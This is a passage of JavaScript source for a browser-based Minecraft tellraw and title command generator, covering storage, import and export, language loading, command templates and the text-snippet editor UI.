// prettier-ignore
const chars = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
let matchLength = 0;
const version = 4;
const tos_version = 1;
const notice = {
    show: false,
    id: 8,
    message: {
        title: "Updated...",
        text: "Hi",
        type: "info"
    }
};
let jobject = [];
let editingIndex = null;
let selectedHover;
let selectedClick;
let downButton;
let upButton;
let extraTextFormat = "raw";
let lang = {};
let currentEdit;
let defaultLanguage = "en-US";
let languageCodes = [defaultLanguage];
let webLangRelations;
let issueLog = [];
let bookPage = 1;
let topPage = 1;
let embed = false;
let quickMake = false;
var quickMakeReceiving = false;
let quickMakeWindow = null;

let miner = null;

/***************************
 * Local Storage Interface *
 ***************************/

let lsm = {
    enabled: false,
    hasTriedLocalStorage: false,
    storage: {},
    checkEnable() {
        if (quickMake) {
            lsm.enabled = true;
        }
        if (!lsm.hasTriedLocalStorage) {
            try {
                localStorage.setItem("dummy", "dummy");
                localStorage.removeItem("dummy");
            } catch (e) {
                lsm.enabled = true;
            }
        }
    },
    setItem(key, value) {
        lsm.checkEnable();
        if (lsm.enabled) {
            lsm.storage[key] = value;
        } else {
            localStorage.setItem(key, value);
        }
    },
    getItem(key) {
        lsm.checkEnable();
        if (lsm.enabled) {
            return lsm.storage[key];
        } else {
            return localStorage.getItem(key);
        }
    },
    clear() {
        lsm.checkEnable();
        if (lsm.enabled) {
            lsm.storage = {};
        } else {
            localStorage.clear();
        }
    },
    removeItem(key) {
        lsm.checkEnable();
        if (lsm.enabled) {
            delete lsm.storage[key];
        } else {
            localStorage.removeItem(key);
        }
    },
    dictionary() {
        lsm.checkEnable();
        if (lsm.enabled) {
            return lsm.storage;
        } else {
            return localStorage;
        }
    }
};

/*********************
 * Utility Functions *
 *********************/

/* http://stackoverflow.com/a/728694/2059595 */
function clone(obj) {
    var copy;

    // Handle the 3 simple types, and null or undefined
    if (null == obj || "object" != typeof obj) return obj;

    // Handle Date
    if (obj instanceof Date) {
        copy = new Date();
        copy.setTime(obj.getTime());
        return copy;
    }

    // Handle Array
    if (obj instanceof Array) {
        copy = [];
        for (var i = 0, len = obj.length; i < len; i++) {
            copy[i] = clone(obj[i]);
        }
        return copy;
    }

    // Handle Object
    if (obj instanceof Object) {
        copy = {};
        for (var attr in obj) {
            if (obj.hasOwnProperty(attr)) copy[attr] = clone(obj[attr]);
        }
        return copy;
    }

    throw new Error("Unable to copy obj! Its type isn't supported.");
}

/* https://stackoverflow.com/q/32733070/2059595 */
String.prototype.escape = function() {
    var tagsToReplace = {
        "<": "&lt;",
        ">": "&gt;",
        " ": "&nbsp;"
    };
    return this.replace(/[&<>"\ ]/g, function(tag) {
        return tagsToReplace[tag] || tag;
    });
};

function hardFail(
    message = "An unexpected erorr occurred which cannot be recovered. Please reload or try again later."
) {
    alert(message);
    showView("js-broken-showdefault", true, true, true);
}

/*********************
 * Export and Import *
 *********************/

function makeExportString() {
    return JSON.stringify({
        command: document.getElementById("command").value,
        jobject: jobject,
        jtemplate: lsm.getItem("jtemplate")
    });
}

function importString(oinpt) {
    var inpt = undefined;
    try {
        inpt = JSON.parse(oinpt);
    } catch (err) {
        logIssue(
            getLanguageString(
                "settings.importtext.exported.failed.header",
                lsm.getItem("langCode")
            ),
            getLanguageString(
                "settings.importtext.exported.failed.description",
                lsm.getItem("langCode")
            ) +
                ": " +
                oinpt,
            true
        );
        return false;
    }
    jobject = inpt["jobject"];
    if (inpt["jtemplate"]) {
        lsm.setItem("jtemplate", inpt["jtemplate"]);
    }
    document.getElementById("command").value = inpt["command"];
    return true;
}

/*****************
 * Issue Reports *
 *****************/

function reportAnIssue(ptitle) {
    var title = "";
    var body = "";
    if (ptitle != undefined) {
        title = `Issue Report - ${ptitle}`;
        body =
            "Please enter steps to reproduce the issue below, as well as any other information you want to include%0A%0A%0A%0A%0A%0A Provided Data - Do not modify below this line%0A%0A```%0A" +
            JSON.stringify(jobject) +
            "%0A```";
    }
    var win = window.open(
        "http://github.com/ezfe/tellraw/issues/new?body=" + body + "&title=" + title,
        "_blank"
    );
    win.focus();
}

function showIssue() {
    alert(`${issueLog[issueLog.length - 1].name}\n${issueLog[issueLog.length - 1].data}`);
}

function logIssue(name, data = null, critical = false) {
    issueLog.push({ name, data });
    if (critical) {
        alert(`${name}\n${data}`);
    }
}

/**********************
 * Language Utilities *
 **********************/

function getLanguageName(langCode) {
    var name = lang[langCode].language.name;
    if (name == "English" && langCode != "en-US") {
        return langCode;
    } else {
        return name;
    }
}

function getLanguageData(langCode) {
    if (lang[langCode] === undefined) {
        return new Promise((resolve, reject) => {
            fetch(`lang/${langCode}.json`, {
                method: "GET"
            })
                .then(function(response) {
                    response.json().then(function(json) {
                        resolve(json);
                    });
                })
                .catch(function(err) {
                    reject(err);
                });
        });
    } else {
        return new Promise((resolve, reject) => {
            resolve(lang[langCode]);
        });
    }
}

function loadOtherLanguages() {
    for (var i = 0; i < languageCodes.length; i++) {
        let code = languageCodes[i];
        getLanguageData(code).then(
            data => {
                lang[code] = data;
                refreshLanguage();
            },
            err => {
                alert(err);
            }
        );
    }
}

/*****************
 * View Controls *
 *****************/

function showView(viewname, suppressAnimation = false, hideOthers = true, hideMenubar = false) {
    var hideMenubarOriginal = hideMenubar;
    if (embed) {
        hideMenubar = true;
    }

    var toHide = $(".view-container").not('.view-container[view="' + viewname + '"]');
    if (!hideMenubar) {
        toHide = toHide.not('.view-container[view="pageheader"]');
    }

    var toShow = $('.view-container[view="' + viewname + '"]');
    if (!hideMenubar) {
        $($('.view-container[view="pageheader"]')).show();
    }

    if (lsm.getItem("donateStatus") == "accepted-initial") {
        toHide = toHide.not('.view-container[view="donate"]');
        $('.view-container[view="donate"]').show();
    }

    if (hideOthers === false) {
        toHide = $("");
    }

    if (suppressAnimation) {
        toHide.hide();
        toShow.show();
    } else {
        toHide.hide();
        toShow.fadeIn();
    }

    if (toShow.length == 0) {
        logIssue("Missing View", viewname, true);
        showView("tellraw");
    }
}

function verify_jobject_format(jdata) {
    var resetError = JSON.stringify({
        title: "Object Verification Failed",
        text: "An error occured and the page has been reset",
        type: "error"
    });

    if (get_type(jdata) == "[object Object]") {
        if (get_type(jdata.extra) == "[object Array]") {
            jdata = jdata.extra;
        } else {
            sessionStorage.setItem("nextTimeAlert", resetError);
            lsm.clear();
            location.reload();
            return;
        }
    }

    if (get_type(jdata) != "[object Array]") {
        sessionStorage.setItem("nextTimeAlert", resetError);
        lsm.clear();
        location.reload();
        return;
    }

    if (jdata.text != "" && get_type(jdata) != "[object Array]") {
        jdata.unshift(new Object());
        jdata[0].text = jdata.text;
        jdata[0].color = jdata.color;
        delete jdata.color;
        jdata[0].bold = jdata.bold;
        delete jdata.bold;
        jdata[0].italic = jdata.italic;
        delete jdata.italic;
        jdata[0].underlined = jdata.underlined;
        delete jdata.underline;
        jdata[0].strikethrough = jdata.strikethrough;
        delete jdata.strikethrough;
        jdata[0].obfuscated = jdata.obfuscated;
        delete jdata.obfuscated;
        jdata.text = "";
    }

    //Tracks changes for "true" --> true
    var booleanUpdateCount = 0;

    var emptyTextHoverRemoved = 0;

    for (var i = 0; i < jdata.length; i++) {
        //Convert show_text to structured format
        if (jdata[i].hoverEvent != undefined) {
            if (jdata[i].hoverEvent.action == "show_text") {
                if (typeof jdata[i].hoverEvent.value == "object") {
                    if (jdata[i].hoverEvent.value.text != "") {
                        jdata[i].hoverEvent.value = {
                            text: "",
                            extra: [jdata[i].hoverEvent.value]
                        };
                    }
                    if (jdata[i].hoverEvent.value.extra.length == 0) {
                        delete jdata[i].hoverEvent;
                        emptyTextHoverRemoved += 1;
                    }
                } else if (typeof jdata[i].hoverEvent.value == "string") {
                    jdata[i].hoverEvent.value = {
                        text: "",
                        extra: [{ text: jdata[i].hoverEvent.value }]
                    };
                }
            }
        }

        if (jdata[i].bold == "true") {
            jdata[i].bold = true;
            booleanUpdateCount++;
        } else if (jdata[i].bold !== true) {
            delete jdata[i].bold;
        }
        if (jdata[i].italic == "true") {
            jdata[i].italic = true;
            booleanUpdateCount++;
        } else if (jdata[i].italic !== true) {
            delete jdata[i].italic;
        }
        if (jdata[i].underlined == "true") {
            jdata[i].underlined = true;
            booleanUpdateCount++;
        } else if (jdata[i].underlined !== true) {
            delete jdata[i].underlined;
        }
        if (jdata[i].strikethrough == "true") {
            jdata[i].strikethrough = true;
            booleanUpdateCount++;
        } else if (jdata[i].strikethrough !== true) {
            delete jdata[i].strikethrough;
        }
        if (jdata[i].obfuscated == "true") {
            jdata[i].obfuscated = true;
            booleanUpdateCount++;
        } else if (jdata[i].obfuscated !== true) {
            delete jdata[i].obfuscated;
        }
    }
    if (booleanUpdateCount > 0) {
        alert(
            `All strings representing boolean values have been updated to true/false values (${booleanUpdateCount} change${booleanUpdateCount ==
            1
                ? ""
                : "s"})`
        );
    }

    if (emptyTextHoverRemoved > 0) {
        alert(
            emptyTextHoverRemoved +
                " empty text hoverevent(s) were removed because Minecraft cannot handle these"
        );
    }

    return jdata;
}

function strictifyItem(job, index) {
    var joi = job[index];
    if (index == 0 || job[index - 1].NEW_ITERATE_FLAG || job[index].NEW_ITERATE_FLAG) {
        return joi;
    }
    var prejoi = job[index - 1];

    for (var i = 0; i < Object.keys(prejoi).length; i++) {
        var key = Object.keys(prejoi)[i];
        var doNotCheckKeys = [
            "text",
            "score",
            "selector",
            "color",
            "clickEvent",
            "hoverEvent",
            "insertion"
        ];
        if (doNotCheckKeys.indexOf(key) == -1) {
            if (prejoi[key] === true && joi[key] === undefined) {
                joi[key] = false;
            }
        } else {
            if (key == "color") {
                if (joi["color"] === undefined) {
                    joi["color"] = noneName();
                }
            }

            continue;
        }
    }

    return joi;
}

function strictifyJObject(job) {
    for (var x = 0; x < job.length; x++) {
        job[x] = strictifyItem(job, x);
    }
    return job;
}

function formatJObjectList(d) {
    data = strictifyJObject(clone(d));

    if (data.length == 0) {
        return [];
    }
    var ret_val = [];
    var currentDataToPlug = [""];
    for (var i = 0; i < data.length; i++) {
        if (data[i].NEW_ITERATE_FLAG) {
            ret_val.push(JSON.stringify(currentDataToPlug));
            currentDataToPlug = [""];
        } else {
            currentDataToPlug.push(data[i]);
        }
    }
    if (!data[data.length - 1].NEW_ITERATE_FLAG) {
        ret_val.push(JSON.stringify(currentDataToPlug));
    }
    return ret_val;
}

function closeExport() {
    $("#exporter").remove();
}

function isScrolledIntoView(elem) {
    elem = "#" + elem;
    var docViewTop = $(window).scrollTop();
    var docViewBottom = docViewTop + $(window).height();

    var elemTop = $(elem).offset().top;
    var elemBottom = elemTop + $(elem).height();

    return elemBottom <= docViewBottom && elemTop >= docViewTop;
}

function goToByScroll(id) {
    if (!isScrolledIntoView(id)) {
        $("html,body").animate({ scrollTop: $("#" + id).offset().top }, "slow");
    }
}

const MOUSE_ACTION_HOVER = "MA_HOVER";
const MOUSE_ACTION_CLICK = "MA_CLICK";
const MOUSE_ACTION_INSERTION = "MA_INSERTION";
let templates = {
    tellraw: {
        command: "/tellraw @p %s",
        version: "1.7",
        formatType: "standardjson",
        mouseActionOptions: [MOUSE_ACTION_HOVER, MOUSE_ACTION_CLICK, MOUSE_ACTION_INSERTION]
    },
    execute_tellraw: {
        command: "/execute @a ~ ~ ~ tellraw @p %s",
        version: "1.8",
        formatType: "standardjson",
        mouseActionOptions: [MOUSE_ACTION_HOVER, MOUSE_ACTION_CLICK, MOUSE_ACTION_INSERTION]
    },
    title: {
        command: "/title @a title %s",
        version: "1.8",
        formatType: "standardjson",
        mouseActionOptions: []
    },
    subtitle: {
        command: "/title @a subtitle %s",
        version: "1.8",
        formatType: "standardjson",
        mouseActionOptions: []
    },
    actionbar: {
        command: "/title @a actionbar %s",
        version: "1.11",
        formatType: "standardjson",
        mouseActionOptions: []
    },
    sign_item: {
        command: '/give @p sign 1 0 {BlockEntityTag:{%s,id:"Sign"}}',
        version: "1.8",
        formatType: "signset",
        mouseActionOptions: []
    },
    sign_block: {
        command: "/blockdata [x] [y] [z] {%s}",
        version: "1.8",
        formatType: "signset",
        mouseActionOptions: []
    },
    book: {
        command: "/give @p written_book 1 0 {pages:%s,title:Book,author:TellrawGenerator}",
        version: "1.8",
        formatType: "bookarray",
        mouseActionOptions: [MOUSE_ACTION_HOVER, MOUSE_ACTION_CLICK, MOUSE_ACTION_INSERTION]
    }
};

function loadTemplate(templateName) {
    let buttons = $(".templateButton")
        .removeClass("btn-success btn-default")
        .addClass("btn-default");

    let target = $(".templateButton[template=" + templateName + "]");

    target.addClass("btn-success").removeClass("btn-default");

    lsm.setItem("jtemplate", templateName);
    $("#command").val(templates[templateName]["command"]);

    refreshOutput();
}

function setObfuscatedString(string) {
    var output = "";
    for (var i = string.length - 1; i >= 0; i--) {
        if (string[i] != " ") {
            output = output + chars[Math.floor(Math.random() * chars.length)];
        } else {
            output += " ";
        }
    }
    return output;
}
function deleteAll() {
    let head = getLanguageString("settings.deleteall.heading", lsm.getItem("langCode"));
    let body = getLanguageString("settings.deleteall.body", lsm.getItem("langCode"));
    if (confirm(`${head}\n${body}`)) {
        jobject = [];
        loadTemplate("tellraw");
        refreshLanguage();
    }
}

function obfuscationPreviewHandler() {
    $(".jsonPreviewObfuscated").html(setObfuscatedString($(".jsonPreviewObfuscated").html()));
    if ($(".jsonPreviewObfuscated").length > 0) {
        setTimeout(obfuscationPreviewHandler, 20);
    }
}

function currentTemplate() {
    return templates[lsm.getItem("jtemplate")];
}

function noneHex() {
    if (currentTemplate().formatType == "bookarray" || currentTemplate().formatType == "signset") {
        return "#000000";
    } else {
        return "#FFFFFF";
    }
}

function noneName() {
    return "none";
    /* I think none is the proper name */
    /*
    if (
        currentTemplate().formatType == "bookarray" ||
        currentTemplate().formatType == "signset"
    ) {
        return "black";
    } else {
        return "white";
    }
    */
}

function getCSSHEXFromWord(w) {
    if (w == "black") return "#000000";
    if (w == "dark_blue") return "#0000B2";
    if (w == "dark_green") return "#14AB00";
    if (w == "dark_aqua") return "#13AAAB";
    if (w == "dark_red") return "#A90400";
    if (w == "dark_purple") return "#A900B2";
    if (w == "gold") return "#FEAC00";
    if (w == "gray") return "#AAAAAA";
    if (w == "dark_gray") return "#555555";
    if (w == "blue") return "#544CFF";
    if (w == "green") return "#5CFF00";
    if (w == "aqua") return "#5BFFFF";
    if (w == "red") return "#FD5650";
    if (w == "light_purple") return "#FD4DFF";
    if (w == "yellow") return "#FFFF00";
    if (w == "white") return "#FFFFFF";
    if (w == "none") return noneHex();
    return noneHex();
}
function removeWhiteSpace(s) {
    return s;
    //BROKEN return s.replace(/ /g, '');
}
function getRowDescription(index) {
    let obj = jobject[index];
    if (obj.NEW_ITERATE_FLAG) {
        return getLanguageString(
            "textsnippets.NEW_ITERATE_FLAG.buttontext",
            lsm.getItem("langCode")
        );
    } else if (get_type(obj.text) != "[object Undefined]") {
        return obj.text;
    } else if (get_type(obj.score) != "[object Undefined]") {
        return `${obj.score.name}'s ${obj.score.objective} score`;
    } else if (get_type(obj.selector) != "[object Undefined]") {
        return `Selector: ${obj.selector}`;
    }
    return `Row #${index + 1}`;
}
function deleteIndex(index) {
    if (
        lsm.getItem("confirmDelete") == "false" ||
        confirm("Confirm deleting\n\n" + getRowDescription(index))
    ) {
        jobject.splice(index, 1);
    }
    refreshOutput();
}
function moveUp(index) {
    jobject.splice(index + 1, 0, jobject.splice(index, 1)[0]);
    refreshOutput();
}
function getSelected(object) {
    if ($("#" + object).length != 0) {
        var e = document.getElementById(object);
        return e.options[e.selectedIndex].value;
    } else {
        return false;
    }
}
function getSelectedIndex(object) {
    var e = document.getElementById(object);
    return e.selectedIndex;
}
function getChecked(id) {
    return document.getElementById(id).checked;
}
function clearExtra() {
    $("#fmtExtraRaw").click();
    $("#clickEventText").val("");
    $("#hoverEventText").val("");
    $("#hoverEventValue").val("");
    $("#hoverEventTextSnippet").val("");
    $("#snippetcolor").val("none");
    $("#snippetcolor").change();
    $("#text_extra").val("");
    $("#color_extra").val("none");
    $("#clickEvent").val("none");
    $("#hoverEvent").val("none");
    $("#insertion_text").val("");
    $("#bold_text_extra").prop("checked", false);
    $("#italic_text_extra").prop("checked", false);
    $("#underlined_text_extra").prop("checked", false);
    $("#strikethrough_text_extra").prop("checked", false);
    $("#obfuscated_text_extra").prop("checked", false);
    $("#hoverEventEntityName").val("");
    $("#hoverEventEntityID").val("");
    $("#hoverEventEntityType").val("");
    $("#textsnippets_add").html(
        getLanguageString("textsnippets.addsnippet", lsm.getItem("langCode"))
    );
    $("#textsnippets-add-button").addClass("btn-default");
    $("#textsnippets-add-button").removeClass("btn-danger");
    $("#textsnippets-add-button").attr("lang", "textsnippets.addsnippet");
    $("#obj_player").val("");
    $("#obj_score").val("");
    $("#text_extra_container").removeClass("has-error");

    refreshOutput();
}
function editExtra(index) {
    editingIndex = index;
    cobject = jobject[editingIndex];

    /* Prep the editor for this object, and for editing */

    $("#textsnippets-add-button").attr("lang", "textsnippets.editsnippet");

    if (cobject.text != undefined) {
        $("#fmtExtraRaw").click();

        $("#text_extra").val(cobject.text);
    } else if (cobject.selector != undefined) {
        $("#fmtExtraSel").click();

        $("#selector").val(cobject.selector);
    } else if (cobject.score != undefined) {
        $("#fmtExtraObj").click();

        $("#obj_player").val(cobject.score.name);
        $("#obj_score").val(cobject.score.objective);
    }

    $("#colorPreviewColor").css("background-color", getCSSHEXFromWord(cobject.color));
    if (cobject.color != undefined) {
        $("#color_extra").val(cobject.color);
    } else {
        $("#color_extra").val("none");
    }

    if (cobject.bold != undefined) {
        $("#bold_text_extra").prop("checked", true);
    } else {
        $("#bold_text_extra").prop("checked", false);
    }
    if (cobject.italic != undefined) {
        $("#italic_text_extra").prop("checked", true);
    } else {
        $("#italic_text_extra").prop("checked", false);
    }
    if (cobject.underlined != undefined) {
        $("#underlined_text_extra").prop("checked", true);
    } else {
        $("#underlined_text_extra").prop("checked", false);
    }
    if (cobject.strikethrough != undefined) {
        $("#strikethrough_text_extra").prop("checked", true);
    } else {
        $("#strikethrough_text_extra").prop("checked", false);
    }
    if (cobject.obfuscated != undefined) {
        $("#obfuscated_text_extra").prop("checked", true);
    } else {
        $("#obfuscated_text_extra").prop("checked", false);
    }

    if (cobject.clickEvent != undefined) {
        $("#clickEvent").val(cobject.clickEvent.action);
        $("#clickEventText").val(cobject.clickEvent.value);
    } else {
        $("#clickEvent").val("none");
        $("#clickEventText").val("");
    }

    if (cobject.hoverEvent != undefined) {
        $("#hoverEvent").val(cobject.hoverEvent.action);
        if ($("#hoverEvent").val() != "show_entity") {
            if (cobject.hoverEvent.action == "show_text") {
                $("#hoverEventText").val(JSON.stringify(cobject.hoverEvent.value));
            } else {
                $("#hoverEventText").val(cobject.hoverEvent.value);
            }
        } else {
            $("#hoverEventEntityID").val(
                cobject.hoverEvent.value.match(/id:([a-zA-Z0-9]+)/g)[0].replace("id:", "")
            );
            $("#hoverEventEntityName").val(
                cobject.hoverEvent.value.match(/name:([a-zA-Z0-9]+)/g)[0].replace("name:", "")
            );
            $("#hoverEventEntityType").val(
                cobject.hoverEvent.value.match(/type:([a-zA-Z0-9]+)/g)[0].replace("type:", "")
            );
        }
    } else {
        $("#hoverEvent").val("none");
        $("#hoverEventText").val("");
    }

    if (cobject.insertion != undefined) {
        $("#insertion_text").val(cobject.insertion);
    }

    showView("add-extra");

    refreshOutput();
}
function get_type(thing) {
    if (thing === null) {
        return "[object Null]";
    }
    return Object.prototype.toString.call(thing);
}
function modifyExtraText(index, text) {
    if (text != "" && text != null) {
        jobject[index].text = text;
    }
    refreshOutput();
}
function addNewIterateFlag() {
    jobject.push({ NEW_ITERATE_FLAG: true });
    refreshOutput();
}
function cancelAddExtra() {
    showView("tellraw");
    clearExtra();
}
function addExtra() {
    if (extraTextFormat == "raw" && $("#text_extra").val() == "") {
        $("#text_extra_container").addClass("has-error");
        $("#text_extra").focus();
        $("#textsnippets-add-button").removeClass("btn-default");
        $("#textsnippets-add-button").addClass("btn-danger");
        return false;
    } else if ($("#hoverEvent").val() == "show_text" && $("#hoverEventTextSnippet").val() != "") {
        alert("You entered text, but never added it!");
        $("#hoverEventTextSnippet").focus();
        $("#textsnippets-add-button").removeClass("btn-default");
        $("#textsnippets-add-button").addClass("btn-danger");
        return false;
    } else {
        showView("tellraw");
    }
    if (get_type(jobject) != "[object Array]") {
        jobject = [];
    }
    var clickEventType = $("#clickEvent").val();
    var hoverEventType = $("#hoverEvent").val();

    var cobject = {};

    var extraIndex = jobject.length - 1;
    if (extraTextFormat == "raw") {
        cobject.text = $("#text_extra").val();
    } else if (extraTextFormat == "obj") {
        cobject.score = new Object();
        cobject.score.name = $("#obj_player").val();
        cobject.score.objective = $("#obj_score").val();
    } else if (extraTextFormat == "sel") {
        cobject.selector = $("#selector").val();
    }

    const color = getSelected("color_extra");
    if (color !== "none") {
        cobject.color = color;
    }

    if (getChecked("bold_text_extra")) {
        cobject.bold = true;
    }
    if (getChecked("italic_text_extra")) {
        cobject.italic = true;
    }
    if (getChecked("underlined_text_extra")) {
        cobject.underlined = true;
    }
    if (getChecked("strikethrough_text_extra")) {
        cobject.strikethrough = true;
    }
    if (getChecked("obfuscated_text_extra")) {
        cobject.obfuscated = true;
    }

    if (clickEventType != "none") {
        cobject.clickEvent = {
            action: clickEventType,
            value: $("#clickEventText").val()
        };
        if (clickEventType == "run_command" || clickEventType == "suggest_command") {
            if ($("#clickEventText").val().length > 256) {
                alert(
                    "Commands cannot be longer than 256 characters!\nYou should edit the length of your command before using this in game."
                );
            }
        }
    }

    if (hoverEventType != "none") {
        cobject.hoverEvent = {
            action: hoverEventType
        };
        if (hoverEventType == "show_text") {
            cobject.hoverEvent.value = JSON.parse($("#hoverEventText").val());
            if ($("#color_hover").val() != "none") {
                cobject.hoverEvent.value.color = $("#color_hover").val();
            }
        } else {
            cobject.hoverEvent.value = $("#hoverEventValue").val();
        }
    }
    if (hoverEventType == "show_entity") {
        if ($("#hoverEventEntityID").val() == "") {
            $("#hoverEventEntityID").val("(ID)");
        }
        if ($("#hoverEventEntityName").val() == "") {
            $("#hoverEventEntityName").val("(Name)");
        }
        if ($("#hoverEventEntityType").val() == "") {
            $("#hoverEventEntityType").val("(Type)");
        }
        cobject.hoverEvent.value =
            "{id:" +
            removeWhiteSpace($("#hoverEventEntityID").val()) +
            ",name:" +
            removeWhiteSpace($("#hoverEventEntityName").val()) +
            ",type:" +
            removeWhiteSpace($("#hoverEventEntityType").val()) +
            "}";
    }
    if ($("#insertion_text").val() != "") cobject.insertion = $("#insertion_text").val();

    if (editingIndex == null) {
        jobject.push(cobject);
    } else {
        jobject[editingIndex] = cobject;
        editingIndex = null;
    }

    clearExtra();
    refreshOutput();
}
function refreshOutput(input) {
    /*VERIFY CONTENTS*/
    jobject = verify_jobject_format(jobject);

    //TODO: What the fuck
    if (
        !$("#command")
            .val()
            .includes("%s")
    ) {
        $("#command").val("/tellraw @p %s");
        lsm.setItem("jtemplate", "tellraw");
    }

    /*EXTRA MODAL COLOR PREVIEW MANAGER*/
    $("#colorPreview").css({
        "background-color": getCSSHEXFromWord(getSelected("color_extra"))
    });

    /*EXTRA VIEWER MANAGER*/
    $("#textsnippets_header").html(
        getLanguageString("textsnippets.header", lsm.getItem("langCode"))
    );
    if (input != "previewLineChange") {
        if (get_type(jobject) == "[object Array]" && jobject.length > 0) {
            var extraOutputPreview = "";
            $("#snippet-container")
                .children()
                .remove();

            let snippetItemsContainer = document.createDocumentFragment();
            for (var i = 0; i <= jobject.length - 1; i++) {
                function makeButton(
                    iconString,
                    classString = "",
                    idString = "",
                    onClickString = ""
                ) {
                    return `<i id=${idString} onclick="${onClickString}" class="${classString} fa fa-${iconString} fa-2x"></i>`;
                }

                let rowContentsOuterContainer = document.createDocumentFragment();
                let rowContentsInnerContainer = document.createDocumentFragment();

                let dragButton = makeButton("sort", "drag-handle");
                let editButton = makeButton("pencil", "", `${i}RowEditButton`, `editExtra(${i});`);
                let deleteButton = `<i onclick="deleteIndex(${i});" class="fa fa-times-circle fa-2x"></i>`;

                if (jobject[i].NEW_ITERATE_FLAG) {
                    // Disable the edit button
                    editButton = `<i style="color:gray;" class="fa fa-pencil fa-2x"></i>`;

                    if (
                        ["bookarray", "signset"].indexOf(
                            templates[lsm.getItem("jtemplate")].formatType
                        ) == -1
                    ) {
                        // Disabled iterate_flag label
                        let disabledLabel = document.createElement("span");
                        disabledLabel.color = "gray";
                        disabledLabel.textDecoration = "line-through";
                        disabledLabel.setAttribute(
                            "lang",
                            "textsnippets.NEW_ITERATE_FLAG.buttontext"
                        );

                        rowContentsInnerContainer.appendChild(disabledLabel);
                    } else {
                        //enabled iterate_flag label
                        let enabledLabel = document.createElement("span");
                        enabledLabel.setAttribute(
                            "lang",
                            "textsnippets.NEW_ITERATE_FLAG.buttontext"
                        );

                        rowContentsInnerContainer.appendChild(enabledLabel);
                    }

                    rowContentsOuterContainer.appendChild(rowContentsInnerContainer);
                } else {
                    if (get_type(jobject[i].text) != "[object Undefined]") {
                        var textInput = document.createElement("input");
                        textInput.id = `previewLine${i}`;
                        textInput.setAttribute(
                            "onkeyup",
                            `jobject[${i}].text = $('#previewLine${i}').val(); refreshOutput('previewLineChange')`
                        );
                        textInput.setAttribute("type", "text");
                        textInput.className = "form-control previewLine";
                        textInput.value = jobject[i].text;

                        rowContentsInnerContainer.appendChild(textInput);
                    } else if (get_type(jobject[i].score) != "[object Undefined]") {
                        var scoreText = document.createElement("input");
                        scoreText.setAttribute("disabled", "true");
                        scoreText.setAttribute("type", "text");
                        scoreText.className = "form-control previewLine";
                        scoreText.value = `${jobject[i].score.name}'s ${jobject[i].score
                            .objective}`;

                        rowContentsInnerContainer.appendChild(scoreText);
                    } else if (get_type(jobject[i].selector) != "[object Undefined]") {
                        var scoreText = document.createElement("input");
                        scoreText.setAttribute("disabled", "true");
                        scoreText.setAttribute("type", "text");
                        scoreText.className = "form-control previewLine";
                        scoreText.value = `Selector: ${jobject[i].selector}`;

                        rowContentsInnerContainer.appendChild(scoreText);
                    }

                    if (
                        input == "noEditIfMatches" &&
                        jobject[i].text != $("#previewLine" + matchTo).val()
                    ) {
                        var blah = "blah"; /* wtf */
                    } else {
                        let rowEl = document.createElement("div");
                        rowEl.className = "row";
                        rowContentsOuterContainer.appendChild(rowEl);

                        /* Contents Column */
                        let contentsColumn = document.createElement("div");
                        contentsColumn.className = "col-xs-10 col-md-11";
                        contentsColumn.appendChild(rowContentsInnerContainer);

                        rowEl.appendChild(contentsColumn);

                        /* Color Column */
                        let colorColumn = document.createElement("div");
                        colorColumn.className = "col-xs-2 col-md-1";

                        let colorPreview = document.createElement("div");
                        colorPreview.className = "colorPreview";
                        colorPreview.backgroundColor = getCSSHEXFromWord(jobject[i].color);

                        colorColumn.appendChild(colorPreview);

                        rowEl.appendChild(colorColumn);
                    }
                }

                /* Controls */
                let snippetManipulationArea = document.createElement("div");
                snippetManipulationArea.className =
                    "col-xs-4 col-sm-2 col-lg-2 snippet-manipulation-area";
                snippetManipulationArea.innerHTML = `${deleteButton}${editButton}${dragButton}`;

                /* Contents (right of controls) */
                let snippetContents = document.createElement("div");
                snippetContents.className = "col-xs-8 col-sm-10 col-lg-10";
                snippetContents.padding = "none";
                snippetContents.appendChild(rowContentsOuterContainer);

                /* Overall container */
                let snippetListItem = document.createElement("li");
                snippetListItem.className = `row extraRow row-margin-top row-margin-bottom mover-row RowIndex${i}`;
                snippetListItem.appendChild(snippetManipulationArea);
                snippetListItem.appendChild(snippetContents);

                snippetItemsContainer.appendChild(snippetListItem);
            }

            document.getElementById("snippet-container").appendChild(snippetItemsContainer);
        } else {
            $("#snippet-container")
                .children()
                .remove();
            $("#snippet-container").html(
                '<ul class="row"><div class="col-xs-12"><h4>' +
                    getLanguageString("textsnippets.nosnippets", lsm.getItem("langCode")) +
                    "</h4></div></div>"
            );
        }
        refreshLanguage();
    }

    /* SHOW MOUSE ACTION OPTIONS FOR JSON TEMPLATES WITH THAT FLAG */
    var mouseOptions = templates[lsm.getItem("jtemplate")].mouseActionOptions;
    if (mouseOptions.indexOf(MOUSE_ACTION_HOVER) != -1) {
        $(".hoverEventContainer").show();

        $(".hoverEventDisabledSigns").hide();
    } else {
        $(".hoverEventContainer").hide();

        $(".hoverEventDisabledSigns").show();
    }

    if (mouseOptions.indexOf(MOUSE_ACTION_CLICK) != -1) {
        $(".clickEventContainer").show();

        //Signs are stupid
        $(".clickEventDisabledSigns").hide();
    } else {
        $(".clickEventContainer").hide();

        //Signs are stupid
        if (templates[lsm.getItem("jtemplate")].formatType == "signset") {
            $(".clickEventDisabledSigns").show();
        }
    }

    if (mouseOptions.indexOf(MOUSE_ACTION_INSERTION) != -1) {
        $(".insertionContainer").show();
    } else {
        $(".insertionContainer").hide();
    }

    /* add-ITERATE-FLAG-label and add-ITERATE-FLAG*/

    var templateItem = templates[lsm.getItem("jtemplate")];

    if (templateItem.formatType == "bookarray" || templateItem.formatType == "signset") {
        $("#add-ITERATE-FLAG").fadeIn();
        if (templateItem.formatType == "bookarray") {
            $("#add-ITERATE-FLAG-label").attr("lang", "textsnippets.NEW_ITERATE_FLAG.add.book");
        } else if (templateItem.formatType == "signset") {
            $("#add-ITERATE-FLAG-label").attr("lang", "textsnippets.NEW_ITERATE_FLAG.add.sign");
        }
        refreshLanguage();
    } else {
        $("#add-ITERATE-FLAG").fadeOut();
    }

    /*EXTRA TRANSLATE STRING MANAGER*/

    if (extraTextFormat == "obj") {
